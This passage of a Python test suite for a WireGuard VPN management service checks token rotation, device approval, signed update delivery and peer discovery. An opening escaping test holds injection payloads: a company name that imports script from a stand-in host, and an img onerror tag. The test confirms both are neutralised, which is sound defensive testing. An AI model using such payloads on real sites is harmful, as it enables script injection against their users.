        evil = "x');import('//evil.example/a.js');('"
        ctx.register("firma1", name=evil)
        for page in (ctx.cabinet("firma1").get("/cabinet").text, ctx.admin.get(f"/admin/companies/{cid}").text):
            assert "onsubmit=" not in page
            assert 'data-confirm="Удалить x&#39;);import(&#39;//evil.example/a.js&#39;);(&#39;?' in page
        ctx.register("firma1", name='"><img src=x onerror=alert(1)>')
        assert "<img src=x" not in ctx.cabinet("firma1").get("/cabinet").text

    def test_kick_all_removes_devices_from_wireguard(self, ctx, net):
        ctx.company("firma1")
        a, b = ctx.register("firma1", "A"), ctx.register("firma1", "B")
        assert {a["_key"], b["_key"]} <= net["peers"].keys()
        ctx.cabinet("firma1").post("/cabinet/join-password", data={"new_password": "newjoin1", "kick_all": "1"})
        assert net["peers"] == {}                      # не только API — и сеть: ключ на ПК больше не пускает
        again = ctx.register("firma1", "A", join="newjoin1", key=a["_key"])
        assert again["status"] == "active" and a["_key"] in net["peers"] and b["_key"] not in net["peers"]

    def test_new_company_requires_approval_by_default(self, ctx, net):
        ctx.company("firma1", approval=True)
        cab = ctx.cabinet("firma1")
        assert 'name="require_approval" value="1" checked' in cab.get("/cabinet").text
        d = ctx.register("firma1")
        assert d["status"] == "pending" and d["_key"] not in net["peers"]
        cab.post(f"/cabinet/devices/{d['device_id']}/approve")
        assert d["_key"] in net["peers"]

    def test_token_rotates_and_copy_disconnects_device(self, ctx, net, monkeypatch):
        from app import db
        from app.routers import api_client
        monkeypatch.setattr(api_client, "TOKEN_ROTATE_SECONDS", 0)
        ctx.company("firma1")
        d = ctx.register("firma1")
        t1 = d["token"]
        r = ctx.api.get("/api/me", headers=ctx.h(t1))
        t2 = r.headers["x-retix-token"]
        assert r.status_code == 200 and t2 and t2 != t1
        # пока клиент не пришёл с новым токеном, старый действует (ответ мог потеряться)
        assert ctx.api.get("/api/me", headers=ctx.h(t1)).status_code == 200
        assert ctx.api.get("/api/peers", headers=ctx.h(t2)).status_code == 200   # клиент перешёл на t2
        # t1 теперь только у копии: ПК отключается, ждёт одобрения, снят с wg0
        r = ctx.api.get("/api/me", headers=ctx.h(t1))
        assert r.status_code == 401 and "другом компьютере" in r.json()["detail"]
        assert ctx.api.get("/api/me", headers=ctx.h(t2)).status_code == 401
        assert d["_key"] not in net["peers"]
        conn = db.connect()
        assert conn.execute("SELECT is_approved FROM devices WHERE id=?", (d["device_id"],)).fetchone()[0] == 0
        assert conn.execute("SELECT COUNT(*) FROM audit_log WHERE action='token_reuse'").fetchone()[0] == 1
        # вход паролем снова возможен, но только после одобрения администратором
        again = ctx.register("firma1", key=d["_key"])
        assert again["status"] == "pending" and d["_key"] not in net["peers"]
        ctx.cabinet("firma1").post(f"/cabinet/devices/{d['device_id']}/approve")
        assert ctx.api.get("/api/me", headers=ctx.h(again["token"])).json()["status"] == "active"

    def test_lost_rotation_response_is_harmless(self, ctx, monkeypatch):
        from app.routers import api_client
        monkeypatch.setattr(api_client, "TOKEN_ROTATE_SECONDS", 0)
        monkeypatch.setattr(api_client, "NEXT_TOKEN_RETRY", 0)
        ctx.company("firma1")
        t1 = ctx.register("firma1")["token"]
        lost = ctx.api.get("/api/me", headers=ctx.h(t1)).headers["x-retix-token"]   # ответ «потерялся»
        for _ in range(3):
            r = ctx.api.get("/api/me", headers=ctx.h(t1))
            assert r.status_code == 200
        t3 = r.headers["x-retix-token"]
        assert t3 != lost
        assert ctx.api.get("/api/me", headers=ctx.h(t3)).status_code == 200
        # невостребованный токен — просто недействителен, ПК не отключается
        assert ctx.api.get("/api/me", headers=ctx.h(lost)).status_code == 401
        assert ctx.api.get("/api/me", headers=ctx.h(t3)).json()["status"] == "active"

    def test_no_rotation_before_interval(self, ctx):
        ctx.company("firma1")
        t = ctx.register("firma1")["token"]
        assert "x-retix-token" not in ctx.api.get("/api/me", headers=ctx.h(t)).headers

    def test_logout_revokes_token_and_peer(self, ctx, net):
        ctx.company("firma1")
        d = ctx.register("firma1")
        assert ctx.api.post("/api/logout", headers=ctx.h(d["token"])).json() == {"ok": True}
        assert ctx.api.get("/api/me", headers=ctx.h(d["token"])).status_code == 401
        assert d["_key"] not in net["peers"]
        assert ctx.register("firma1", key=d["_key"])["status"] == "active"   # вход заново — без одобрения

    def test_old_database_is_migrated(self, monkeypatch, tmp_path):
        import sqlite3
        from app import db
        path = tmp_path / "old.db"
        old = sqlite3.connect(path)
        old.executescript("""CREATE TABLE companies (id INTEGER PRIMARY KEY, login TEXT, name TEXT DEFAULT '',
            cabinet_pass_hash TEXT, join_pass_hash TEXT, subnet_index INTEGER, max_devices INTEGER DEFAULT 20,
            require_approval INTEGER DEFAULT 0, full_lan INTEGER DEFAULT 0, share_name TEXT DEFAULT 'share',
            share_ports TEXT DEFAULT '445', is_active INTEGER DEFAULT 1, created_at TEXT);
            CREATE TABLE devices (id INTEGER PRIMARY KEY, company_id INTEGER, name TEXT, hostname TEXT DEFAULT '',
            public_key TEXT UNIQUE, ip TEXT UNIQUE, token_hash TEXT UNIQUE, is_share_host INTEGER DEFAULT 0,
            is_blocked INTEGER DEFAULT 0, is_approved INTEGER DEFAULT 1, client_version TEXT DEFAULT '',
            last_handshake INTEGER DEFAULT 0, endpoint TEXT DEFAULT '', last_seen TEXT, created_at TEXT);
            INSERT INTO devices(company_id, name, public_key, ip, token_hash) VALUES (1, 'PC', 'k', '10.66.1.2', 'h');""")
        old.commit(); old.close()
        monkeypatch.setattr(db, "DB_PATH", str(path))
        db.init(); db.init()   # повторный запуск ничего не ломает
        conn = db.connect()
        row = conn.execute("SELECT token_hash, token_next_hash, token_set_at FROM devices").fetchone()
        assert tuple(row) == ("h", None, 0)
        conn.execute("SELECT COUNT(*) FROM token_history").fetchone()


class TestAdminApprovalToggle:
    def _approval(self, cid):
        from app import db
        return db.connect().execute("SELECT require_approval FROM companies WHERE id=?", (cid,)).fetchone()[0]

    def test_create_form_has_checkbox_on_by_default(self, ctx):
        page = ctx.admin.get("/admin").text
        assert 'name="require_approval" value="1" checked' in page and 'name="approval_form"' in page

    def test_create_with_and_without_approval(self, ctx):
        base = {"cabinet_password": "cab123", "join_password": "join123", "approval_form": "1"}
        ctx.admin.post("/admin/companies", data=base | {"login": "withap", "require_approval": "1"})
        ctx.admin.post("/admin/companies", data=base | {"login": "noap"})          # галочка снята
        ctx.admin.post("/admin/companies", data={"login": "plain", "cabinet_password": "cab123",
                                                  "join_password": "join123"})  # без формы — включено
        from app import db
        rows = dict(db.connect().execute("SELECT login, require_approval FROM companies").fetchall())
        assert rows == {"withap": 1, "noap": 0, "plain": 1}
        assert ctx.register("noap")["status"] == "active"
        assert ctx.register("withap")["status"] == "pending"

    def test_toggle_on_company_page(self, ctx, net):
        cid = ctx.company("firma1")                       # одобрение выключено
        old = ctx.register("firma1", "OLD")
        page = ctx.admin.get(f"/admin/companies/{cid}").text
        assert "> Новые ПК ждут одобрения" in page and 'value="1" checked> Новые ПК ждут одобрения' not in page
        ctx.admin.post(f"/admin/companies/{cid}/update",
                       data={"name": "firma1", "max_devices": 20, "is_active": "1", "require_approval": "1"})
        assert self._approval(cid) == 1
        assert 'value="1" checked> Новые ПК ждут одобрения' in ctx.admin.get(f"/admin/companies/{cid}").text
        new = ctx.register("firma1", "NEW")
        assert new["status"] == "pending" and new["_key"] not in net["peers"]
        assert old["_key"] in net["peers"]                # уже подключённые остаются в сети
        ctx.admin.post(f"/admin/companies/{cid}/devices/{new['device_id']}/approve")
        assert new["_key"] in net["peers"]
        ctx.admin.post(f"/admin/companies/{cid}/update", data={"name": "firma1", "max_devices": 20, "is_active": "1"})
        assert self._approval(cid) == 0
        assert "approval=True" in ctx.admin.get(f"/admin/companies/{cid}").text   # в журнале


# ---------------------------------------------------------------- обновления через суперадмина

class TestUpdates:
    @staticmethod
    def csrf(client):
        return re.search(r'name="csrf" value="([^"]+)"', client.get("/admin/updates").text).group(1)

    def upload(self, ctx, data, publish=True, client=None, **form):
        c = client or ctx.admin
        fields = {"csrf": self.csrf(c), **form} | ({"publish": "1"} if publish else {})
        r = c.post("/admin/updates", data=fields, files={"file": ("setup.exe", data, "application/octet-stream")},
                   follow_redirects=False)
        assert r.status_code == 303, r.text
        from urllib.parse import parse_qs, urlparse
        return parse_qs(urlparse(r.headers["location"]).query).get("msg", [""])[0]

    @staticmethod
    def rel(version):
        from app import db
        return db.connect().execute("SELECT * FROM app_releases WHERE version=?", (version,)).fetchone()

    def device(self, ctx, company, version="1.0.5"):
        d = ctx.register(company)
        d["h"] = ctx.h(d["token"]) | {"X-Retix-Version": version}
        return d

    def test_upload_reads_version_signs_and_publishes(self, ctx):
        import base64
        import json
        from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PublicKey
        data = fake_setup("1.0.6")
        assert "1.0.6 загружена и опубликована" in self.upload(ctx, data, notes="Новое меню")
        rel = self.rel("1.0.6")
        assert rel["published"] == 1 and rel["size"] == len(data) and rel["file_name"] == "RetixHub_Setup_1.0.6.exe"
        page = ctx.admin.get("/admin/updates").text
        pub = re.search(r'<code class="key" id="pubkey">([^<]+)</code>', page).group(1)
        body = base64.b64decode(rel["manifest"])
        Ed25519PublicKey.from_public_bytes(base64.b64decode(pub)).verify(base64.b64decode(rel["signature"]), body)
        m = json.loads(body)
        assert m == {"app": "Retix Hub", "kind": "retixhub-update", "version": "1.0.6",
                     "file": "RetixHub_Setup_1.0.6.exe", "size": len(data), "sha256": rel["sha256"]}
        assert "Новое меню" in page and "опубликована" in page

    @pytest.mark.parametrize("data,form,err", [
        (b"not an exe", {}, "не программа Windows"),
        (fake_setup("1.0.6", product="Retix"), {}, "не установщик Retix Hub"),
        (fake_setup("1.0.6"), {"version": "1.0.7"}, "версия 1.0.6, а указано 1.0.7"),
        (fake_setup("1.0.6"), {"version": "abc"}, "не версия"),
        (fake_setup("1.0.6"), {"scope": "some"}, "хотя бы одну компанию"),
        (fake_setup("1.0.6"), {"publish_at": "2020-01-01T10:00"}, "уже прошло"),
    ])
    def test_upload_rejected(self, ctx, data, form, err):
        assert err in self.upload(ctx, data, **form)
        from app import db
        assert db.connect().execute("SELECT COUNT(*) FROM app_releases").fetchone()[0] == 0

    def test_upload_duplicate_and_csrf_and_login(self, ctx):
        self.upload(ctx, fake_setup("1.0.6"))
        assert "уже загружена" in self.upload(ctx, fake_setup("1.0.6"))
        r = ctx.admin.post("/admin/updates", data={"csrf": "wrong"}, files={"file": ("s.exe", fake_setup("1.0.7"), "x/y")})
        assert "устарела" in r.text and self.rel("1.0.7") is None
        anon = ctx.TestClient(ctx.app)
        r = anon.post("/admin/updates", files={"file": ("s.exe", fake_setup("1.0.8"), "x/y")}, follow_redirects=False)
        assert r.headers["location"] == "/admin/login" and self.rel("1.0.8") is None
        assert anon.get("/admin/updates", follow_redirects=False).headers["location"] == "/admin/login"

    def test_device_gets_newest_published_in_scope(self, ctx):
        a_id, b_id = ctx.company("firma1"), ctx.company("firma2")
        a, b = self.device(ctx, "firma1"), self.device(ctx, "firma2")
        self.upload(ctx, fake_setup("1.0.6"))                                    # всем
        self.upload(ctx, fake_setup("1.0.7"), scope="some", companies=[str(a_id)])   # пилот на firma1
        self.upload(ctx, fake_setup("1.0.9"), publish=False)                     # черновик
        assert ctx.api.get("/api/update", headers=a["h"]).json()["update"]["version"] == "1.0.7"
        assert ctx.api.get("/api/update", headers=b["h"]).json()["update"]["version"] == "1.0.6"
        r = ctx.api.get("/api/me", headers=a["h"])
        assert r.headers["x-retix-update"] == "1.0.7" and len(r.headers["x-retix-update-sha"]) == 16
        assert ctx.api.get("/api/update", headers=a["h"] | {"X-Retix-Version": "1.0.7"}).json()["update"] is None
        assert ctx.api.get("/api/me", headers=a["h"] | {"X-Retix-Version": "1.0.7"}).headers["x-retix-update"] == "none"
        assert b_id

    def test_unpublish_schedule_and_due(self, ctx):
        from app import db
        ctx.company("firma1")
        d = self.device(ctx, "firma1")
        self.upload(ctx, fake_setup("1.0.6"), publish=False)
        rid = self.rel("1.0.6")["id"]
        assert ctx.api.get("/api/update", headers=d["h"]).json()["update"] is None      # черновик
        csrf = self.csrf(ctx.admin)
        assert "уже прошло" in ctx.admin.post(f"/admin/updates/{rid}", data={
            "csrf": csrf, "action": "schedule", "publish_at": "2020-01-01T10:00"}).text
        ctx.admin.post(f"/admin/updates/{rid}", data={"csrf": csrf, "action": "schedule", "publish_at": "2099-01-01T10:00"})
        assert self.rel("1.0.6")["publish_at"] == "2099-01-01 10:00:00"
        assert ctx.api.get("/api/update", headers=d["h"]).json()["update"] is None
        conn = db.connect()
        conn.execute("UPDATE app_releases SET publish_at='2020-01-01 10:00:00' WHERE id=?", (rid,))   # время пришло
        conn.commit()
        assert ctx.api.get("/api/update", headers=d["h"]).json()["update"]["version"] == "1.0.6"
        assert self.rel("1.0.6")["published"] == 1
        assert conn.execute("SELECT COUNT(*) FROM audit_log WHERE action='update_publish' "
                            "AND details LIKE '%по расписанию%'").fetchone()[0] == 1
        ctx.admin.post(f"/admin/updates/{rid}", data={"csrf": csrf, "action": "unpublish"})
        assert ctx.api.get("/api/update", headers=d["h"]).json()["update"] is None
        assert ctx.admin.post(f"/admin/updates/{rid}", data={"csrf": "bad", "action": "publish"}).text.count("устарела")
        assert self.rel("1.0.6")["published"] == 0

    def test_file_by_ticket_with_resume(self, ctx, monkeypatch):
        import hashlib
        import time as _time
        from app import updates
        ctx.company("firma1")
        d = self.device(ctx, "firma1")
        data = fake_setup("1.0.6")
        self.upload(ctx, data)
        u = ctx.api.get("/api/update", headers=d["h"]).json()["update"]
        c = ctx.TestClient(ctx.app)                       # без токена: билет в ссылке
        r = c.get(u["url"])
        assert r.status_code == 200 and hashlib.sha256(r.content).hexdigest() == u["sha256"]
        r = c.get(u["url"], headers={"Range": "bytes=1000-"})
        assert r.status_code == 206 and r.content == data[1000:]
        assert c.get(u["url"], headers={"Range": f"bytes={len(data)}-"}).status_code == 416
        assert c.get(u["url"].replace("&s=", "&s=0")).status_code == 403          # подделан
        rid = u["id"]
        exp = int(_time.time()) - 1
        assert c.get(f"/api/update/file/{rid}?d={d['device_id']}&e={exp}&s={updates._ticket_sig(rid, d['device_id'], exp)}").status_code == 403
        ctx.cabinet("firma1").post(f"/cabinet/devices/{d['device_id']}/block")
        assert c.get(u["url"]).status_code == 403                                   # ПК заблокирован
        assert self.rel("1.0.6")["downloads"] == 1

    def test_other_company_cannot_download_pilot(self, ctx):
        a_id = ctx.company("firma1"); ctx.company("firma2")
        a, b = self.device(ctx, "firma1"), self.device(ctx, "firma2")
        self.upload(ctx, fake_setup("1.0.7"), scope="some", companies=[str(a_id)])
        url = ctx.api.get("/api/update", headers=a["h"]).json()["update"]["url"]
        from app import updates
        rid = int(re.search(r"/file/(\d+)", url).group(1))
        forged = updates.ticket_url(rid, b["device_id"])          # даже с честным билетом другой компании
        assert ctx.TestClient(ctx.app).get(forged).status_code == 404

    def test_state_reported_and_shown(self, ctx):
        from app import db
        ctx.company("firma1")
        d = self.device(ctx, "firma1")
        self.upload(ctx, fake_setup("1.0.6"))
        ctx.api.get("/api/me", headers=d["h"] | {"X-Retix-Update-State": "downloading:1.0.6"})
        page = ctx.admin.get("/admin/updates").text
        assert "скачивает 1.0.6" in page and "ждут её: <b>1</b>" in page
        ctx.api.get("/api/me", headers=d["h"] | {"X-Retix-Update-State": "<script>"})   # мусор не пишется
        assert db.connect().execute("SELECT update_state FROM devices").fetchone()[0] == "downloading:1.0.6"
        ctx.api.get("/api/me", headers=d["h"] | {"X-Retix-Version": "1.0.6", "X-Retix-Update-State": "none"})
        row = db.connect().execute("SELECT client_version, update_state FROM devices").fetchone()
        assert tuple(row) == ("1.0.6", "none")
        assert "на версии: <b>1</b>" in ctx.admin.get("/admin/updates").text

    def test_site_download_uses_release_for_all(self, ctx):
        a_id = ctx.company("firma1")
        c = ctx.TestClient(ctx.app)
        pilot, release = fake_setup("1.0.7"), fake_setup("1.0.6")
        self.upload(ctx, pilot, scope="some", companies=[str(a_id)])
        assert c.get("/download/client", follow_redirects=False).status_code == 303   # пилот на сайте не виден
        self.upload(ctx, release)
        r = c.get("/download/client")
        assert r.content == release and "RetixHub_Setup_1.0.6.exe" in r.headers["content-disposition"]
        assert "RetixHub_Setup_1.0.6.exe" in c.get("/").text
        assert "на сайте" in ctx.admin.get("/admin/updates").text

    def test_legacy_version_for_clients_1_0_5(self, ctx):
        import hashlib
        a_id = ctx.company("firma1")
        c = ctx.TestClient(ctx.app)
        assert c.get("/api/client/version").json() == {"version": None}
        self.upload(ctx, fake_setup("1.0.7"), scope="some", companies=[str(a_id)])   # пилот 1.0.5 не видит
        assert c.get("/api/client/version").json() == {"version": None}
        data = fake_setup("1.0.6")
        self.upload(ctx, data)
        info = c.get("/api/client/version").json()
        assert info["version"] == "1.0.6" and info["size"] == len(data)
        assert info["sha256"] == hashlib.sha256(data).hexdigest() == hashlib.sha256(c.get(info["url"]).content).hexdigest()

    def test_update_answer_has_public_key(self, ctx):
        ctx.company("firma1")
        d = self.device(ctx, "firma1")
        pub = re.search(r'id="pubkey">([^<]+)<', ctx.admin.get("/admin/updates").text).group(1)
        assert ctx.api.get("/api/update", headers=d["h"]).json()["public_key"] == pub

    def test_save_notes_scope_and_delete(self, ctx):
        import os
        from app import updates
        a_id = ctx.company("firma1")
        self.upload(ctx, fake_setup("1.0.6"))
        rel = self.rel("1.0.6")
        csrf = self.csrf(ctx.admin)
        ctx.admin.post(f"/admin/updates/{rel['id']}", data={"csrf": csrf, "action": "save", "notes": "Исправления",
                                                           "scope": "some", "companies": [str(a_id)]})
        rel = self.rel("1.0.6")
        assert rel["notes"] == "Исправления" and rel["companies"] == f"[{a_id}]"
        path = os.path.join(updates.updates_dir(), rel["stored_name"])
        assert os.path.exists(path)
        assert ctx.admin.get(f"/admin/updates/{rel['id']}/file").content[:2] == b"MZ"
        ctx.admin.post(f"/admin/updates/{rel['id']}/delete", data={"csrf": csrf})
        assert self.rel("1.0.6") is None and not os.path.exists(path)

    def test_admin_nav_links(self, ctx):
        page = ctx.admin.get("/admin").text
        assert 'href="/admin/updates"' in page
        assert "Обновления клиента" in ctx.admin.get("/admin/updates").text


# ---------------------------------------------------------------- доступ «видит другие ПК» (только в программе)

class TestPeerAccess:
    def test_hidden_list_and_no_sending_but_network_same(self, ctx, net):
        ctx.company("firma1")
        a, b = ctx.register("firma1", "Офис"), ctx.register("firma1", "Касса")
        ha, hb = ctx.h(a["token"]), ctx.h(b["token"])
        assert {p["name"] for p in ctx.api.get("/api/peers", headers=hb).json()["peers"]} == {"Офис", "Касса"}
        assert ctx.api.get("/api/me", headers=hb).json()["show_peers"] is True     # по умолчанию — видит
        rules_before = list(net["rules"])
        cab = ctx.cabinet("firma1")
        assert "больше не видит" in cab.post(f"/cabinet/devices/{b['device_id']}/peers_off").text
        r = ctx.api.get("/api/peers", headers=hb).json()
        assert [p["name"] for p in r["peers"]] == ["Касса"] and r["peers"][0]["is_me"] and r["peers_hidden"] is True
        assert ctx.api.get("/api/me", headers=hb).json()["show_peers"] is False
        # писать нельзя, получать — можно (офис пишет кассе)
        r = ctx.api.post("/api/messages", headers=hb, json={"to": a["device_id"], "text": "привет"})
        assert r.status_code == 403 and "доступ" in r.json()["detail"]
        assert ctx.api.post("/api/messages", headers=ha, json={"to": b["device_id"], "text": "касса?"}).status_code == 200
        assert [m["text"] for m in ctx.api.get("/api/messages", headers=hb).json()["messages"]] == ["касса?"]
        # остальные его по-прежнему видят; сеть не изменилась
        assert "Касса" in {p["name"] for p in ctx.api.get("/api/peers", headers=ha).json()["peers"]}
        assert b["_key"] in net["peers"] and net["rules"] == rules_before
        cab.post(f"/cabinet/devices/{b['device_id']}/peers_on")
        assert len(ctx.api.get("/api/peers", headers=hb).json()["peers"]) == 2

    def test_toggle_in_cabinet_and_admin_pages(self, ctx):
        cid = ctx.company("firma1")
        d = ctx.register("firma1")
        page = ctx.cabinet("firma1").get("/cabinet").text
        assert "Видит ПК" in page and f"/cabinet/devices/{d['device_id']}/peers_off" in page
        ctx.admin.post(f"/admin/companies/{cid}/devices/{d['device_id']}/peers_off")
        assert f"/admin/companies/{cid}/devices/{d['device_id']}/peers_on" in ctx.admin.get(f"/admin/companies/{cid}").text
        assert "device_peers_off" in ctx.admin.get(f"/admin/companies/{cid}").text      # в журнале

    def test_other_company_cannot_toggle(self, ctx):
        ctx.company("firma1"); ctx.company("firma2")
        d = ctx.register("firma2")
        r = ctx.cabinet("firma1").post(f"/cabinet/devices/{d['device_id']}/peers_off")
        assert "не найдено" in r.text
        assert ctx.api.get("/api/me", headers=ctx.h(d["token"])).json()["show_peers"] is True


class TestDirectLan:
    """Прямой путь по локальной сети: сервер сводит соседей, только в компании с «любым трафиком»."""

    def _office(self, ctx, full_lan=True, n=2):
        from app import db
        cid = ctx.company("office")
        if full_lan:
            conn = db.connect(); conn.execute("UPDATE companies SET full_lan=1 WHERE id=?", (cid,)); conn.commit(); conn.close()
        pcs = [ctx.register("office", name=f"PC{i}") for i in range(n)]
        for i, pc in enumerate(pcs):
            self._report(ctx, pc, [f"192.168.1.{10 + i}/24"], 51000 + i)
            self._seen(pc, "203.0.113.5")
        return cid, pcs

    @staticmethod
    def _report(ctx, pc, lan, port, direct=()):
        r = ctx.api.post("/api/heartbeat", headers=ctx.h(pc["token"]),
                         json={"client_version": "1.0.11", "lan": lan, "wg_port": port, "direct": list(direct)})
        assert r.status_code == 200, r.text

    @staticmethod
    def _seen(pc, public_ip, online=True):
        """Монитор: пакеты WireGuard от ПК приходят с public_ip."""
        import time
        from app import db
        now = int(time.time()) if online else 0
        conn = db.connect()
        conn.execute("UPDATE devices SET endpoint=?, last_handshake=?, last_rx_at=? WHERE id=?",
                     (f"{public_ip}:4{pc['device_id']:04d}", now, now, pc["device_id"]))
        conn.commit(); conn.close()

    def _me(self, ctx, pc):
        return ctx.api.get("/api/me", headers=ctx.h(pc["token"])).json()

    def test_same_office_are_neighbors(self, ctx):
        _, (a, b) = self._office(ctx)
        me = self._me(ctx, a)
        assert me["direct_enabled"] is True
        assert me["direct"] == [{"id": b["device_id"], "public_key": b["_key"], "ip": b["ip"],
                                 "endpoints": ["192.168.1.11:51001"]}]
        assert [n["id"] for n in self._me(ctx, b)["direct"]] == [a["device_id"]]

    def test_only_with_full_lan(self, ctx):
        _, (a, b) = self._office(ctx, full_lan=False)
        me = self._me(ctx, a)
        assert me["direct_enabled"] is False and me["direct"] == []

    def test_other_office_or_offline_or_stale_not_neighbors(self, ctx):
        import time
        from app import db
        _, (a, b) = self._office(ctx)
        self._seen(b, "198.51.100.7")                       # другой роутер — другой офис
        assert self._me(ctx, a)["direct"] == []
        self._seen(b, "203.0.113.5", online=False)          # выключен
        assert self._me(ctx, a)["direct"] == []
        self._seen(b, "203.0.113.5")
        conn = db.connect()
        conn.execute("UPDATE devices SET lan_at=? WHERE id=?", (int(time.time()) - 3600, b["device_id"]))
        conn.commit(); conn.close()
        assert self._me(ctx, a)["direct"] == []             # адреса давно не обновлялись
        self._report(ctx, b, ["192.168.1.11/24"], 0)        # порт туннеля неизвестен
        assert self._me(ctx, a)["direct"] == []

    def test_blocked_pending_other_company_not_neighbors(self, ctx):
        cid, (a, b, c) = self._office(ctx, n=3)
        ctx.company("rival")
        r = ctx.register("rival", name="R")
        self._report(ctx, r, ["192.168.1.50/24"], 51050); self._seen(r, "203.0.113.5")
        from app import db
        conn = db.connect()
        conn.execute("UPDATE devices SET is_blocked=1 WHERE id=?", (b["device_id"],))
        conn.execute("UPDATE devices SET is_approved=0 WHERE id=?", (c["device_id"],))
        conn.commit(); conn.close()
        assert self._me(ctx, a)["direct"] == []
        assert self._me(ctx, r)["direct"] == []

    def test_no_nat_same_subnet(self, ctx):
        """Сервер в той же сети, что и ПК (без NAT): соседи — ПК одной подсети."""
        _, (a, b) = self._office(ctx)
        self._seen(a, "192.168.1.10"); self._seen(b, "192.168.1.11")
        assert self._me(ctx, a)["direct"][0]["endpoints"] == ["192.168.1.11:51001"]
        self._report(ctx, b, ["192.168.7.11/24"], 51001); self._seen(b, "192.168.7.11")
        assert self._me(ctx, a)["direct"] == []

    def test_shared_subnet_first_and_own_ips_skipped(self, ctx):
        _, (a, b) = self._office(ctx)
        # у обоих VirtualBox 192.168.56.1 — свой же адрес соседу не отдаём
        self._report(ctx, a, ["192.168.1.10/24", "192.168.56.1/24"], 51000)
        self._report(ctx, b, ["192.168.56.1/24", "172.16.0.4/16", "192.168.1.11/24"], 51001)
        assert self._me(ctx, a)["direct"][0]["endpoints"] == ["192.168.1.11:51001", "172.16.0.4:51001"]

    def test_lan_addresses_cleaned(self, ctx):
        from app import services
        assert services.clean_lan(["192.168.1.10/24", "127.0.0.1/8", "169.254.1.2/16", "10.66.3.2/32",
                                   "8.8.8.8/24", "garbage", "192.168.1.0/24", "10.1.2.3/8", "192.168.1.10/24",
                                   "10.0.0.1/4"]) == ["192.168.1.10/24", "10.1.2.3/8"]
        ctx.company("solo")
        d = ctx.register("solo", name="PC")
        r = ctx.api.post("/api/heartbeat", headers=ctx.h(d["token"]), json={"lan": ["1.1.1.1/24"] * 17})
        assert r.status_code == 422
        r = ctx.api.post("/api/heartbeat", headers=ctx.h(d["token"]), json={"wg_port": 70000})
        assert r.status_code == 422

    def test_old_client_heartbeat_keeps_lan(self, ctx):
        _, (a, b) = self._office(ctx)
        assert ctx.api.post("/api/heartbeat", headers=ctx.h(b["token"]), json={"client_version": "1.0.10"}).json()["ok"]
        assert self._me(ctx, a)["direct"]

    def test_cabinet_shows_direct_peers(self, ctx):
        _, (a, b) = self._office(ctx)
        self._report(ctx, a, ["192.168.1.10/24"], 51000, direct=[b["device_id"], 999])
        page = ctx.cabinet("office").get("/cabinet").text
        assert "напрямую: PC1" in page and "999" not in page.split("напрямую:")[1][:40]
        assert "мимо сервера" in page


class TestDirectWan:
    """Прямой путь через интернет: ПК разных офисов, сервер отдаёт их внешние адреса (пробой NAT)."""
    OFFICE_A, OFFICE_B = "81.95.10.5", "84.54.20.7"     # публичные адреса двух офисов

    def _pcs(self, ctx, full_lan=True, wan=(True, True), n=2):
        from app import db
        cid = ctx.company("chain")
        if full_lan:
            conn = db.connect(); conn.execute("UPDATE companies SET full_lan=1 WHERE id=?", (cid,)); conn.commit(); conn.close()
        pcs = [ctx.register("chain", name=f"PC{i}") for i in range(n)]
        for i, pc in enumerate(pcs):
            self._report(ctx, pc, [f"192.168.{i + 1}.10/24"], 51000 + i, wan=wan[i] if i < len(wan) else True)
            TestDirectLan._seen(pc, (self.OFFICE_A, self.OFFICE_B)[i % 2])
        return cid, pcs

    @staticmethod
    def _report(ctx, pc, lan, port, wan=True, direct=()):
        body = {"client_version": "1.0.12", "lan": lan, "wg_port": port, "direct": list(direct)}
        r = ctx.api.post("/api/heartbeat", headers=ctx.h(pc["token"]), json=body | ({"wan": True} if wan else {}))
        assert r.status_code == 200, r.text

    def _me(self, ctx, pc):
        return ctx.api.get("/api/me", headers=ctx.h(pc["token"])).json()

    def test_other_offices_get_internet_addresses(self, ctx):
        import time
        _, (a, b) = self._pcs(ctx)
        me = self._me(ctx, a)
        assert me["direct"] == []                                         # не локальная сеть
        assert me["direct_wan"] == [{"id": b["device_id"], "public_key": b["_key"], "ip": b["ip"],
                                     "endpoints": [f"{self.OFFICE_B}:4{b['device_id']:04d}"]}]
        assert self._me(ctx, b)["direct_wan"][0]["endpoints"] == [f"{self.OFFICE_A}:4{a['device_id']:04d}"]
        assert abs(me["time"] - time.time()) < 5                          # часы сервера: общее окно попыток

    def test_same_office_is_lan_not_internet(self, ctx):
        _, (a, b) = self._pcs(ctx)
        TestDirectLan._seen(b, self.OFFICE_A)
        me = self._me(ctx, a)
        assert me["direct_wan"] == [] and [n["id"] for n in me["direct"]] == [b["device_id"]]

    def test_only_with_full_lan(self, ctx):
        _, (a, b) = self._pcs(ctx, full_lan=False)
        assert self._me(ctx, a)["direct_wan"] == []

    def test_old_client_on_either_side(self, ctx):
        """Клиент до 1.0.12 соседа через интернет не добавит — пробовать с ним бессмысленно."""
        _, (a, b) = self._pcs(ctx, wan=(True, False))
        assert self._me(ctx, a)["direct_wan"] == [] and self._me(ctx, b)["direct_wan"] == []
        ctx.api.post("/api/heartbeat", headers=ctx.h(b["token"]), json={"client_version": "1.0.10"})
        assert self._me(ctx, a)["direct_wan"] == []

    def test_offline_stale_blocked_or_private_not_offered(self, ctx):
        import time
        from app import db
        _, (a, b) = self._pcs(ctx)
        TestDirectLan._seen(b, self.OFFICE_B, online=False)
        assert self._me(ctx, a)["direct_wan"] == []                       # выключен
        TestDirectLan._seen(b, "192.168.77.5")                            # сервер видит частный адрес — не интернет
        assert self._me(ctx, a)["direct_wan"] == []
        TestDirectLan._seen(b, "100.64.3.9")                              # CGNAT оператора — тоже не внешний
        assert self._me(ctx, a)["direct_wan"] == []
        TestDirectLan._seen(b, self.OFFICE_B)
        TestDirectLan._seen(a, "10.0.0.5")                                # у самого ПК нет внешнего адреса
        assert self._me(ctx, a)["direct_wan"] == []
        TestDirectLan._seen(a, self.OFFICE_A)
        conn = db.connect()
        conn.execute("UPDATE devices SET lan_at=? WHERE id=?", (int(time.time()) - 3600, b["device_id"]))
        conn.commit(); conn.close()
        assert self._me(ctx, a)["direct_wan"] == []                       # давно не было heartbeat
        self._report(ctx, b, [], 0)                                        # без локальной сети — можно
        assert [n["id"] for n in self._me(ctx, a)["direct_wan"]] == [b["device_id"]]
        conn = db.connect(); conn.execute("UPDATE devices SET is_blocked=1 WHERE id=?", (b["device_id"],)); conn.commit(); conn.close()
        assert self._me(ctx, a)["direct_wan"] == []

    def test_other_company_never(self, ctx):
        _, (a,) = self._pcs(ctx, n=1)
        from app import db
        cid = ctx.company("rival")
